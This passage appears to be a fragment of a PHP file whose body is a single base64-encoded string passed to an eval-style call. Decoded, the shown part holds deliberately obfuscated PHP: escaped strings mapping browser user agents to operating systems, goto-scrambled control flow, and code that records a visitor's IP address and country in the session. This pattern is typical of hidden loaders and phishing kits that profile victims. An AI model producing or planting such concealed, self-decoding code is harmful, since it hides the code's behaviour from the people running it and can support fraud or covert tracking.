XHg2ZFwxNDFceDYzXHg1Zlx4NzBceDZmXDE2N1wxNDVceDcyXHg3MFwxNDNcNTdceDY5IiA9PiAiXHg0ZFx4NjFceDYzXDQwXDExN1x4NTNcNDBceDM5IiwgIlx4MmZcMTU0XHg2OVwxNTZceDc1XHg3OFw1N1x4NjkiID0+ICJceDRjXDE1MVwxNTZcMTY1XDE3MCIsICJcNTdceDc1XHg2MlwxNjVceDZlXDE2NFwxNjVceDJmXDE1MSIgPT4gIlwxMjVceDYyXHg3NVx4NmVcMTY0XHg3NSIsICJceDJmXHg2OVwxNjBcMTUwXHg2Zlx4NmVcMTQ1XDU3XHg2OSIgPT4gIlx4NjlcMTIwXHg2OFx4NmZcMTU2XDE0NSIsICJceDJmXHg2OVx4NzBcMTU3XHg2NFw1N1wxNTEiID0+ICJceDY5XDEyMFx4NmZceDY0IiwgIlx4MmZceDY5XDE2MFx4NjFceDY0XHgyZlx4NjkiID0+ICJceDY5XDEyMFx4NjFcMTQ0IiwgIlx4MmZcMTQxXDE1NlwxNDRcMTYyXDE1N1x4NjlcMTQ0XDU3XDE1MSIgPT4gIlwxMDFceDZlXDE0NFx4NzJceDZmXDE1MVwxNDQiLCAiXHgyZlwxNDJceDZjXDE0MVwxNDNceDZiXHg2MlwxNDVceDcyXHg3MlwxNzFceDJmXHg2OSIgPT4gIlx4NDJcMTU0XDE0MVx4NjNcMTUzXHg0Mlx4NjVceDcyXDE2MlwxNzEiLCAiXHgyZlx4NzdceDY1XHg2MlwxNTdcMTYzXHgyZlwxNTEiID0+ICJceDRkXHg2Zlx4NjJceDY5XDE1NFx4NjUiKTsgZm9yZWFjaCAoJE9TIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgaWYgKHByZWdfbWF0Y2goJHJlZ2V4LCAkVVNFUl9BR0VOVCkpIHsgJE9TX0VSUk9SID0gJHZhbHVlOyB9IH0gcmV0dXJuICRPU19FUlJPUjsgfSBnb3RvIHJvTFNYOyByOHMxcjogJF9TRVNTSU9OWyJceDRlXHg2YVx4NmZcMTYwXDE0NiJdID0gaXNzZXQoJGluZm9bIlx4NjNcMTU3XHg3NVx4NmVcMTY0XDE2MlwxNzFceDQzXHg2ZlwxNDRcMTQ1Il0pID8gJGluZm9bIlx4NjNcMTU3XDE2NVx4NmVcMTY0XHg3Mlx4NzlcMTAzXDE1N1x4NjRcMTQ1Il0gOiBudWxsOyBnb3RvIE14dk5vOyBwd096RjogJElwQ291bnQgPSBGT3hfVEdIX1goJHVzZXJBZ2VudCk7IGdvdG8gTENPZ3I7IG5FRkVVOiAkaXBQb3J0QXJyYXkgPSBleHBsb2RlKCJceDNhIiwgJGlwQWRkcmVzcyk7IGdvdG8gVjM2cEc7IGNrbFg5OiA=')); ?>
